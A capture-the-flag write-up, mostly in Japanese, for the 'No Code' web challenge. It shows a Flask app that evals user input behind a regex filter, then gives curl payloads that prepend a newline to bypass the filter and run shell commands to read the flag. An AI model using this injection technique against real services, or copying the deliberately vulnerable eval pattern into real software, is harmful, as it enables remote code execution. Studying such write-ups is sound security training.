# No Code:Web:362pts
I made a web app that lets you run any code you want. Just kidding!  

[https://uoftctf-no-code.chals.io/](https://uoftctf-no-code.chals.io/)  
[app.py](app.py)  

# Solution
URLとソースが渡される。  
初めにURLにアクセスするが何もない。  
```bash
$ curl https://uoftctf-no-code.chals.io/
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```
ソースは以下のようであった。  
```python
from flask import Flask, request, jsonify
import re

app = Flask(__name__)

@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code', '')
    if re.match(".*[\x20-\x7E]+.*", code):
        return jsonify({"output": "jk lmao no code"}), 403
    result = ""
    try:
        result = eval(code)
    except Exception as e:
        result = str(e)

    return jsonify({"output": result}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1337, debug=False)
```
`/execute`にPOSTしたものを`re.match`で検証して`eval`しているようだ。  
RCEしたいが、一見すると何のコードも実行できない。  
ここで`.*[\x20-\x7E]+.*`は改行にマッチしないことに気づく。  
`re.match`は先頭がマッチするかどうかなので、先頭に改行を挟めば以降は任意のコードを記述できる。  
以下のように行う。  
```bash
$ curl -X POST 'https://uoftctf-no-code.chals.io/execute' -d 'code=
__import__("subprocess").getoutput("ls")
'
{"output":"app.py\nflag.txt\nrequirements.txt"}
$ curl -X POST 'https://uoftctf-no-code.chals.io/execute' -d 'code=
__import__("subprocess").getoutput("cat flag.txt")
'
{"output":"uoftctf{r3g3x_3p1c_f41L_XDDD}"}
```
flagが読み取れた。  

## uoftctf{r3g3x_3p1c_f41L_XDDD}